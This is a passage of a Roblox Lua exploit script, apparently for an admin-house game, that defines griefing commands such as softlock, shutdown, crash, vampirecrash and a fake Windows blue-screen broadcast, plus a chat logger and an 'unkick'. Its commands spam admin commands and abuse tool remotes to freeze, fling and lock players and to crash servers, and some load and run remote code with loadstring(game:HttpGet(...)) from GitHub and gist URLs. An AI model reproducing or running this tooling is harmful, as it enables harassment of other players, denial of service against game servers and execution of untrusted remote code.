            print("waiting for player")
        until game.Players.LocalPlayer:DistanceFromCharacter(v.Character.Head.Position) < 10
        game.Players:Chat("freeze "..v.Name)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.Character.Head.CFrame * CFrame.new(0,25,2.5)
            for i=1,50 do
    game.Players:Chat("gear me 200237939")
    print("given skateboard")
    end
    repeat wait() until #game.Players.LocalPlayer.Backpack:GetChildren() > 40
    wait(0.1)
    for i,v2 in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
        spawn(function()
        v2.Parent = game.Players.LocalPlayer.Character
        wait(0.1)
        v2.LocalScript.Disabled = true
        v2:WaitForChild("RemoteControl"):WaitForChild("ClientControl").OnClientInvoke = function(Value)
        return v.Character.Head.Position + Vector3.new(0,2,0)
        end
        repeat wait()
        v2:Activate()
        until v2.Parent ~= game.Players.LocalPlayer.Character
        end)
    end
    
        repeat wait() until #game.Players.LocalPlayer.Backpack:GetChildren() < 5
        wait(0.4)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0,0,0)
        game.Players:Chat("respawn me")
    end
end)

addCommand("softlock",{"player"},function(args)
    for i,v in pairs(GetPlayers(args[1])) do
	Connections["_SOFTLOCK"..v.Name] = game:GetService("RunService").RenderStepped:Connect(function()
        	if not v then Connections["_SOFTLOCK"..v.Name]:Disconnect() error("Break") end
        	pcall(function()
			if PunishSoftlock then
				if v and v.Character and v.Character.Parent ~= game.Lighting then
					game.Players:Chat("punish "..v.Name)
					v.Character.Parent = game.Lighting
				end
			else
        		if v.Character.HumanoidRootPart.Position.Y < 500 then
        			game.Players:Chat("skydive "..v.Name)
        			game.Players:Chat("fling "..v.Name)
        			v.Character.HumanoidRootPart.Position = v.Character.HumanoidRootPart.Position+Vector3.new(0,999,0)
        		end
        		if not v.Character:FindFirstChildOfClass("Model") then
            			game.Players:Chat("name "..v.Name..[[ []]..ScriptName..[[]
You are currently softlocked.]])
        		end
        		if v:DistanceFromCharacter(v.Character.Torso.Position)>1 then
            			game.Players:Chat("size "..v.Name.." 0.3")
        		end
			end
        	end)
    	end)
    end
end)

addCommand("unsoftlock",{"player"},function(args)
    for i,v in pairs(GetPlayers(args[1])) do
	pcall(function()
		Connections["_SOFTLOCK"..v.Name]:Disconnect()
		if PunishSoftlock then
			game.Players:Chat("unpunish "..v.Name)
		end
	end)
    end
end)

addCommand("unban",{"player"},function(args)
    for i,v in pairs(Player) do
        if table.find(Banned,v.Name) then
            table.remove(Banned,table.find(Banned,v.Name))
        end
    end
end)

addCommand("shutdown",{},function()
	for i=1,5 do
		game.Players:Chat("size all .3")
	end
	for i=1,13 do
		game.Players:Chat("rocket/all all all")
		game.Players:Chat("freeze all all all")
		game.Players:Chat("dog all all all")
	end
	for i=1,5 do
		game.Players:Chat("size all 10")
	end
	for i=1,200 do
		game.Players:Chat("clone all all all")
	end
end)

addCommand("clearconsole",{},function()
	for i=1,500 do
		print''
	end
end)

addCommand("crash",{},function()
    runCommand(prefix.."shutdown",{})
end)

addCommand("vampirecrash",{},function()
	if Loops.antiservercrash then Loops.antiservercrash = false spawn(function()wait(3)runCommand(prefix.."antiservercrash",{})end)end
    game.Players:Chat("gear me 94794847")
    repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("VampireVanquisher")
    game.Players.LocalPlayer.Backpack:FindFirstChild("VampireVanquisher").Parent = game.Players.LocalPlayer.Character
    repeat wait() until not game.Players.LocalPlayer.Character.VampireVanquisher:FindFirstChild("Coffin")
    repeat wait() until game.Players.LocalPlayer.Character.VampireVanquisher:FindFirstChild("Remote")
    game.Players.LocalPlayer.Character.VampireVanquisher.Remote:FireServer(Enum.KeyCode.Q)
    for i=1,5 do
        game.Players:Chat("size me 0.3")
    end
end)

addCommand("iishutdown",{},function()
    game.Players:Chat("fogend 0")
    game.Players:Chat("fogcolor 0 0 0")
    game.Players:Chat("time 0")
    if PersonsAdmin then
    game.Players:Chat([[h/




























##########################################
i hope both sides of your pillow are warm
##########################################]])
else
game.Players:Chat([[h 




























##########################################
i hope both sides of your pillow are warm
##########################################]])
end
    runCommand(prefix.."playbypass",{"syko"})
    wait()
    runCommand(prefix.."vampirecrash",{})
    spawn(function()
        wait(0.5)
        runCommand(prefix.."shutdown",{})
    end)
end)

addCommand("bluescreen",{},function()
local cacheAntiLighting = Loops.antilighting
if cacheAntiLighting then runCommand(prefix.."unantilighting",{}) end
game.Players:Chat("time 14")
game.Players:Chat("fogcolor 55 120 191")
game.Players:Chat("fogend 0")
if PersonsAdmin then
game.Players:Chat("h/  \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n         /                                                                                \n\n\n\n\ ")
game.Players:Chat("h/  \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\ ⚪   /                                                                                \n\n\n\n\ ")
game.Players:Chat("h/  \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\ \n   |                                                                            \n\n\n\n\ ")
game.Players:Chat("h/  \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\ \n \n   |                                                                            \n\n\n\n\ ")
game.Players:Chat("h/  \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\ \n \n \n   |                                                                            \n\n\n\n\ ")
game.Players:Chat("h/  \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\ \n \n \n   |                                                                            \n\n\n\n\ ")
game.Players:Chat("h/  \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\ \n \n \n \n \n       \\                                                                               \n\n\n\n\ ")
game.Players:Chat("h/  \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\ \n \n \n \n \n   ⚪                                                                                      \n\n\n\n\ ")
game.Players:Chat("h/  \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\ \n \n \n \n \n \n     \\                                                                            \n\n\n\n\ ")
game.Players:Chat("h/ \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n \n \n \n Your Computer ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you. \n\n\n\n\n\n\ ")
game.Players:Chat("h/ \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n \n Error code: VIDEO_SCHEDULER_INTERNAL_ERROR  \n\n\n\n\n\n\ ")
else
game.Players:Chat("h  \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n         /                                                                                \n\n\n\n\ ")
game.Players:Chat("h  \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\ ⚪   /                                                                                \n\n\n\n\ ")
game.Players:Chat("h  \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\ \n   |                                                                            \n\n\n\n\ ")
game.Players:Chat("h  \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\ \n \n   |                                                                            \n\n\n\n\ ")
game.Players:Chat("h  \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\ \n \n \n   |                                                                            \n\n\n\n\ ")
game.Players:Chat("h  \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\ \n \n \n   |                                                                            \n\n\n\n\ ")
game.Players:Chat("h  \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\ \n \n \n \n \n       \\                                                                               \n\n\n\n\ ")
game.Players:Chat("h  \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\ \n \n \n \n \n   ⚪                                                                                      \n\n\n\n\ ")
game.Players:Chat("h  \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\ \n \n \n \n \n \n     \\                                                                            \n\n\n\n\ ")
game.Players:Chat("h \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n \n \n \n Your Computer ran into a problem and needs to restart. We're just collecting some error info, and then we'll restart for you. \n\n\n\n\n\n\ ")
game.Players:Chat("h \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n\n\n\n\n\n\ \n \n Error code: VIDEO_SCHEDULER_INTERNAL_ERROR  \n\n\n\n\n\n\ ")
end
wait(3)
if cacheAntiLighting then runCommand(prefix.."antilighting",{}) end
end)

addCommand("bluescreencrash",{"vampire"},function(args)
	task.spawn(function()
		runCommand(prefix.."bluescreen",{})
	end)
	wait(.5)
	if args[1] == "true" then
		print("vamping")
		runCommand(prefix.."vampirecrash",{})
	else
		print("downing")
		runCommand(prefix.."shutdown",{})
	end
end)

addCommand("chatlogs",{},function()
    spawn(function()
        -- Gui to Lua
-- Version: 3.2

-- Instances:

local chatlogger = Instance.new("ScreenGui")
local Main = Instance.new("ImageLabel")
local uic1 = Instance.new("UICorner")
local scroll = Instance.new("ScrollingFrame")
local UIListLayout = Instance.new("UIListLayout")
local ImageButton = Instance.new("ImageButton")
local UICorner = Instance.new("UICorner")
local TextLabel = Instance.new("TextLabel")
local template = Instance.new("ImageButton")
local UICorner_2 = Instance.new("UICorner")
local TextLabel_2 = Instance.new("TextLabel")

--Properties:

chatlogger.Name = "chatlogger"
chatlogger.IgnoreGuiInset = true
chatlogger.ResetOnSpawn = false
chatlogger.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
chatlogger.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Main.Name = "Main"
Main.Parent = chatlogger
Main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Main.LayoutOrder = 1
Main.Position = UDim2.new(0.0278281905, 0, 0.0933544338, 0)
Main.Size = UDim2.new(0, 296, 0, 429)
Main.Image = "rbxassetid://11400472392"
Main.Draggable = true
Main.ScaleType = Enum.ScaleType.Crop

spawn(function()
    local UserInputService = game:GetService("UserInputService")

local gui = Main

local dragging
local dragInput
local dragStart
local startPos

local function update(input)
	local delta = input.Position - dragStart
	gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end

gui.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = input.Position
		startPos = gui.Position
		
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

gui.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		if gui.Visible then
			update(input)
		end
	end
end)
end)

uic1.CornerRadius = UDim.new(0, 16)
uic1.Name = "uic1"
uic1.Parent = Main

scroll.Name = "scroll"
scroll.Parent = Main
scroll.Active = true
scroll.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
scroll.BackgroundTransparency = 1.000
scroll.BorderSizePixel = 0
scroll.LayoutOrder = 1
scroll.Position = UDim2.new(0,0,0,20)
scroll.Size = UDim2.new(1, 0, 1, -20)
scroll.CanvasSize = UDim2.new(0, 0, 0, 0)

UIListLayout.Parent = scroll
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

ImageButton.Parent = Main
ImageButton.AnchorPoint = Vector2.new(1, 0)
ImageButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageButton.Position = UDim2.new(1, 0, 0, 0)
ImageButton.Size = UDim2.new(0, 20, 0, 20)
ImageButton.Image = "rbxassetid://11400472392"

UICorner.Parent = ImageButton

TextLabel.Parent = ImageButton
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderSizePixel = 0
TextLabel.Size = UDim2.new(1, 0, 1, 0)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "X"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 24.000
TextLabel.TextStrokeTransparency = 0.000

template.Name = "template"
template.Parent = chatlogger
template.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
template.BackgroundTransparency = 1.000
template.BorderSizePixel = 0
template.Size = UDim2.new(1, 0, 0, 15)
template.Visible = false
template.Image = "rbxassetid://11400472392"
template.ScaleType = Enum.ScaleType.Tile
template.TileSize = UDim2.new(0.330000013, 0, 1, 0)

UICorner_2.Parent = template

TextLabel_2.Parent = template
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Size = UDim2.new(1, 0, 1, 0)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "[Username]: deez nuts"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextStrokeTransparency = 0.000
TextLabel_2.TextWrapped = true
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left

-- Scripts:

local function SGVLNS_fake_script() -- Main.LocalScript 
	local script = Instance.new('LocalScript', Main)

	local ui = script.Parent.Parent
	local scroll = ui.Main.scroll
	local template = ui.template
	
	local numericalthing = 0
	
	local logger = game.Players.PlayerChatted:Connect(function(nobodycares,player,message)
		local temp = template:Clone()
		temp.Parent = scroll
		temp.Visible = true
		temp.TextLabel.Text = "["..player.Name.."]: "..message
		temp.LayoutOrder = numericalthing
		temp.MouseButton1Click:Connect(function()
		    setclipboard(temp.Textlabel.Text)
		end)
		numericalthing=numericalthing-1
	end)
	
	ui.Main.ImageButton.MouseButton1Click:Connect(function()
		logger:Disconnect()
		ui:Destroy()
	end)
end
coroutine.wrap(SGVLNS_fake_script)()
    end)
end)

addCommand("hiddenlogs",{},function()
    runCommand(prefix.."chatlogs",{})
end)

addCommand("logs",{},function()
    runCommand(prefix.."chatlogs",{})
end)

addCommand("draggablelogs",{},function()
	Loops.draggablelogs = true
	repeat wait()
		for i,v in pairs(game.Players.LocalPlayer.PlayerGui:GetChildren()) do
			if v.Name == "ScrollGui" and not v:FindFirstChild("Fixed") then
				Instance.new("StringValue",v).Name = "Fixed"
								
				spawn(function()
				    local UserInputService = game:GetService("UserInputService")
					
					local gui = v.TextButton
					
					local dragging
					local dragInput
					local dragStart
					local startPos
					
					local function update(input)
						local delta = input.Position - dragStart
						gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
					end
					
					gui.InputBegan:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
							dragging = true
							dragStart = input.Position
							startPos = gui.Position
							
							input.Changed:Connect(function()
								if input.UserInputState == Enum.UserInputState.End then
									dragging = false
								end
							end)
						end
					end)
					
					gui.InputChanged:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
							dragInput = input
						end
					end)
					
					UserInputService.InputChanged:Connect(function(input)
						if input == dragInput and dragging then
							if gui.Visible then
								update(input)
							end
						end
					end)
				end)
			end
		end
	until not Loops.draggablelogs
end)

addCommand("undraggablelogs",{},function()
	Loops.draggablelogs = false
end)

addCommand("gui",{},function()
    local Library = loadstring(game:GetObjects("rbxassetid://7657867786")[1].Source)()
    
    local UI = Library:CreateWindow({
    Name = ScriptName, -- string.reverse(" "..'s\'ii')..string.reverse('u'..'t'.."S").."p"..'i'.."d A".."d"..string.reverse("nim")
    Theme = {
    Info = "n"..string.reverse"4".."tW"..'as'.."Ter"..tostring(tostring(string.reverse("nim"))).."ated#".."0"..tostring(math.random(505,505)).."\nDo not leak",
    Credit = false,
    Background = ""
    }
    })
    
    local Shortcuts = UI:CreateTab({
    Name = "Shortcuts"
    })
    
    local Toggles = Shortcuts:CreateSection({
    Name = "Toggles",
    Side = "Left"
    })
    
    Toggles:AddToggle({
    Name = "Anti Abuse",
    Callback = function(Value)
        if Value then
            runCommand(prefix.."antiabuse",{})
        else
            runCommand(prefix.."unantiabuse",{})
        end
    end
    })
    
    local Buttons = Shortcuts:CreateSection({
    Name = "Buttons",
    Side = "Left"
    })
    
    Buttons:AddButton({
    Name = "Fix Color",
    Callback = function()
    runCommand(prefix.."fixcolor",{})
    end
    })
    
    Buttons:AddButton({
    Name = "Give Random Gear",
    Callback = function()
    runCommand(prefix.."giverandomgears",{"1"})
    end
    })
    
    Buttons:AddButton({
    Name = "Rejoin",
    Callback = function()
    runCommand(prefix.."rejoin",{})
    end
    })
    
    Buttons:AddButton({
    Name = "Serverhop",
    Callback = function()
    runCommand(prefix.."serverhop",{})
    end
    })
    
    local Others = Shortcuts:CreateSection({
    Name = "Others",
    Side = "Left"
    })
    
    Others:AddTextbox({
        Name = "Music Lock",
        Value = 0,
        Callback = function(Value)
            Value = tonumber(Value)
            if Value == 0 then
                runCommand(prefix.."unmusiclock",{})
            else
                runCommand(prefix.."musiclock",{tostring(Value)})
            end
        end
    })
end)

addCommand("unkick",{},function()
    game.Players.LocalPlayer:Kick()
    game:GetService("GuiService"):ClearError()
    wait(1)
    local oldchr = game.Players.LocalPlayer.Character
    game.Players.LocalPlayer.Character.Archivable = true
    local cl = game.Players.LocalPlayer.Character:Clone()
    cl.Parent = game.Players.LocalPlayer.Character.Parent
    game.Players.LocalPlayer.Character = cl
    cl.Animate.Disabled = true
    cl.Animate.Disabled = false
    cl.Humanoid.DisplayName = ' '
    workspace.CurrentCamera.CameraSubject = cl.Humanoid
    oldchr:Destroy()
end)

addCommand("flashback",{},function()
    local s,f=pcall(function()
    game.Players:Chat("clr")
    game.Players:Chat("fix")
    wait(0.5)
    game.Players.LocalPlayer:Kick()
game:GetService("GuiService"):ClearError()
wait(1)
local oldchr = game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character.Archivable = true
local cl = game.Players.LocalPlayer.Character:Clone()
cl.Parent = game.Players.LocalPlayer.Character.Parent
game.Players.LocalPlayer.Character = cl
cl.Animate.Disabled = true
cl.Animate.Disabled = false
cl.Humanoid.DisplayName = ' '
workspace.CurrentCamera.CameraSubject = cl.Humanoid
oldchr:Destroy()
for i,v in pairs(game.Players:GetPlayers()) do
    if v ~= game.Players.LocalPlayer then
        if v.Character then v.Character:Destroy() end
        v:Destroy() 
   end
end
local plr = game.Players.LocalPlayer
local chr = plr.Character
local cam = workspace.CurrentCamera
function getSoundId(githubLink,fileName)
    if not isfolder("LocalMusic") then makefolder("LocalMusic") end
    if not isfile("LocalMusic/"..tostring(fileName)..".mp3") then
        writefile("LocalMusic/"..tostring(fileName)..".mp3",HttpRequest({Url=githubLink, Method='GET'}).Body)
    end
    return getcustomasset("LocalMusic/"..tostring(fileName)..".mp3")
end
local Decals = {"4637746375","6576347905","6979660610","78447822","7506172164","710679541","6526139723","2782324454","9280156413","6673968185","1437859391","11819926495","8069372755","8821060194","6667438696","7451945741","275625339","6979666270","227600968","112902315","11820215885","12891462220","11705026198","7715663746","11820057661","11819921165","8821061671","9958218456","5045344938","5436305015","9828069207","1050963173","11950243047","62923965","26578092","10622919574","10623114008","8652370597","90567189","814707877","139437522","8821440921","9407842249","76908662","6979668008","127035411","9407831723","7715625420","126607040","1117897387","9627062113","6193821107","8833336491","6217147104","10622890506","5279365022","11160841806","9951340450","90742857","10186330449","11951646028","78930760","711250116","93390411","7451485806","4442686497","11112641193","8653620118","7933794221","2409898220","5328727837","1133551146","9446428596","3063526287","5168236799","3027413675","205375663","8071500208","5130124013","30726676","7451990646","120563099","10767242113","11151804229","475921335","7209933282","88658595","1032973774","9242918232","82838470","10839342505","10005446702","3296252270","3274375334","5879662438","2782426915","12748865890","924553118","10262947428","11285917237","32578004","12547653948","6510882688","894509910","8092894207","5974623667","25415923","141195004","10590231496","24150152","157995783","9882201716","11163672979","12018015043","178331926","8202921878","12682732708","10879175658","119019743","442876020","3523974778","11104232963","121661942","7762449183","1972219027","8743276425","10685184013","6009007680","11402172695","12487013349","10991955724","12654203777","279568210","9605261863","13001519646","4618126429","1927066326","9597859611","176206792"}
cam.CameraType = "Scriptable"
chr.Humanoid.WalkSpeed = 0
chr.Humanoid.JumpPower = 0
chr.HumanoidRootPart.CFrame = CFrame.new(-0.755462825, 3.69999933, -47.6910248)
local LocalMusic = Instance.new("Sound",workspace)
LocalMusic.Name = "LocalMusic__"
LocalMusic.Volume = 10
LocalMusic.Looped = true
LocalMusic.SoundId = getSoundId("https://raw.githubusercontent.com/iiDk-the-actual/Music/main/jealous.mp3","jealous")
LocalMusic:Play()
cam.CFrame = chr["Right Arm"].CFrame * CFrame.new(0.3,-0.9,-1.4)*CFrame.Angles(0,math.rad(180),0)
local CorrectionEffect = Instance.new("ColorCorrectionEffect",game.Lighting)
wait(4.6)
cam.CFrame = chr["Head"].CFrame * CFrame.new(0,0,-2.5)*CFrame.Angles(0,math.rad(180),0)
spawn(function()
    game:GetService("RunService").RenderStepped:Connect(function()
        cam.CFrame = cam.CFrame:Lerp(chr["Head"].CFrame * CFrame.new(0,0,-1.5)*CFrame.Angles(0,math.rad(180),0),0.001)
    end)
end)
wait(0.5)
workspace.Terrain["_Game"].Workspace.Baseplate.Transparency = 1
CorrectionEffect.Saturation = -1
local LocalPart = Instance.new("Part",game.Players.LocalPlayer.Character)
LocalPart.Anchored = true
LocalPart.Size = Vector3.new(25.5,13,1)
LocalPart.Transparency = 0
LocalPart.Color = Color3.new(1,1,1)
LocalPart.CFrame = workspace.CurrentCamera.CFrame*CFrame.new(0,0,-10)*CFrame.Angles(0,math.rad(180),0)
local Decal = Instance.new("Decal",LocalPart)
while true do
Decal.Texture = "rbxthumb://type=Asset&id="..Decals[math.random(1,#Decals)].."&w=150&h=150"
wait(0.1)
end
end) if not s then print(f)end
end)

addCommand("combustablelemon",{},function()
    game.Players:Chat("pm me I'M THE MAN THAT'S GONNA [REDACTED] YOUR HOUSE DOWN!\nWITH THE LEMONS!\n\nTo use, click while holding the lemon.\nOr, for the mobile users (imagine), hit the button in the bottom right corner")
    game.Players:Chat("gear me 19703476")
repeat game:GetService("RunService").RenderStepped:Wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("YellowSnowball")
print("found da snowball")
local CombustableLemon = game.Players.LocalPlayer.Backpack:FindFirstChild("YellowSnowball")
CombustableLemon:FindFirstChildOfClass("LocalScript").Disabled = true
CombustableLemon.TextureId = "rbxassetid://7285797360"
CombustableLemon.Name = "CombustableLemon"

-- Gui to Lua
-- Version: 3.2

-- Instances:

local lemonui = Instance.new("ScreenGui")
local lemonbutton = Instance.new("TextButton")

--Properties:

lemonui.Name = "lemonui"
lemonui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
lemonui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
lemonui.Enabled = false

lemonbutton.Name = "lemonbutton"
lemonbutton.Parent = lemonui
lemonbutton.AnchorPoint = Vector2.new(1, 1)
lemonbutton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
lemonbutton.Position = UDim2.new(1, 0, 1, 0)
lemonbutton.Size = UDim2.new(0, 110, 0, 110)
lemonbutton.Font = Enum.Font.SourceSans
lemonbutton.Text = "imagine being on mobile"
lemonbutton.TextColor3 = Color3.fromRGB(0, 0, 0)
lemonbutton.TextScaled = true
lemonbutton.TextSize = 14.000
lemonbutton.TextWrapped = true

local bombing = false
CombustableLemon.Equipped:Connect(function(yeahh)
    lemonui.Enabled = true
    game.Players:Chat("music 899460722")
    repeat wait() until workspace.Terrain["_Game"].Folder.Sound.IsLoaded
    wait(0.1)
    spawn(function()
	    wait(game:GetService("Workspace").Terrain["_Game"].Folder.Sound.TimeLength - 0.2)
	    game.Players:Chat("music nan")
    end)
end)

CombustableLemon.Unequipped:Connect(function()
    lemonui.Enabled = false
end)

game:GetService("UserInputService").InputBegan:Connect(function(ip,gp)
    if not bombing and not gp and ip.UserInputType == Enum.UserInputType.MouseButton1 and CombustableLemon and CombustableLemon.Parent == game.Players.LocalPlayer.Character then
    bombing = true
    game.Players:Chat("music 132323614")
    wait(0.6)
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack({"I'M THE MAN WHO'S GONNA BURN YOUR HOUSE DOWN!","All"}))
    wait(2.9)
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack({"WITH THE LEMONS!","All"}))
    wait(0.6)
    game.Players:Chat("explode me")
    wait(0.7)
    game.Players:Chat("music nan")
    end
end)

lemonbutton.MouseButton1Click:Connect(function()
    if not bombing and CombustableLemon and CombustableLemon.Parent == game.Players.LocalPlayer.Character then
    bombing = true
    game.Players:Chat("music 132323614")
    wait(0.6)
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack({"I'M THE MAN WHO'S GONNA BURN YOUR HOUSE DOWN!","All"}))
    wait(2.9)
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack({"WITH THE LEMONS!","All"}))
    wait(0.6)
    game.Players:Chat("explode me")
    wait(0.7)
    game.Players:Chat("music nan")
    end
end)
end)

addCommand("dex",{},function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
end)

addCommand("explorer",{},function()
	runCommand(prefix.."dex",{})
end)

addCommand("banhammer",{},function(args)
    game.Players:Chat("pm me Check the developer console for a tutorial on how to use this.")
    loadstring(game:HttpGet("https://gist.githubusercontent.com/iiDk-the-actual/c22667e1601001c347aa8da41622aaed/raw/0714ef377dc50262e8fc6645089c03effe77ad56/KAH-BanHammer"))()
end)

addCommand("fuckcamera",{"players"},function(args)
	for i,v in pairs(GetPlayers(args[1])) do
		local vchar = v.Character
		game.Players:Chat("name "..v.Name.." "..ScriptName)
		repeat wait() until vchar.Parent==nil or vchar:FindFirstChildOfClass("Model")
		game.Players:Chat("unname "..v.Name)
	end
end)

addCommand("freezecamera",{"players"},function(args)
    local Player = GetPlayers(args[1])
for i,v in pairs(Player) do
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(99999,99999,99999)
local thedollarsecondary = Instance.new("Part",game.Players.LocalPlayer.Character)
		thedollarsecondary.Anchored = true
		thedollarsecondary.Size = Vector3.new(10,1,10)
		thedollarsecondary.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-5,0)
    game.Players:Chat("gear me 94794847")
    repeat wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("VampireVanquisher")
    local VampireVanquisher = game.Players.LocalPlayer.Backpack:FindFirstChild("VampireVanquisher")
    VampireVanquisher.Parent = game.Players.LocalPlayer.Character
    repeat wait() until not game.Players.LocalPlayer.Character.VampireVanquisher:FindFirstChild("Coffin")
    
    repeat wait()
        print(game.Players.LocalPlayer:DistanceFromCharacter(v.Character.Head.Position))
    firetouchinterest(VampireVanquisher.Handle,v.Character.Head,0)firetouchinterest(VampireVanquisher.Handle,v.Character.Head,1)
    until game.Players.LocalPlayer:DistanceFromCharacter(v.Character.Head.Position) < 10
    game.Players:Chat("respawn me")
end
end)

addCommand("playbongos",{"musicstring"},function(args)
    soundTableBongo = {
		["b"] = "LeftBongoLowSound",
		["h"] = "LeftBongoHighSound",
		["m"] = "RightBongoLowSound",
		["j"] = "RightBongoHighSound"
	}

local str = args[1]
	for i = 1, string.len(str) do
	    pcall(function()
	    PlayBongo(soundTableBongo[str:sub(i,i)])
		end)
		wait(2/15)
	end
end)

addCommand("playguitar",{"musicstring"},function(args)
	for i,v in pairs(args) do
	    pcall(function()
        PlayNote(v)
        end)
	    wait(2/15)
	end
end)

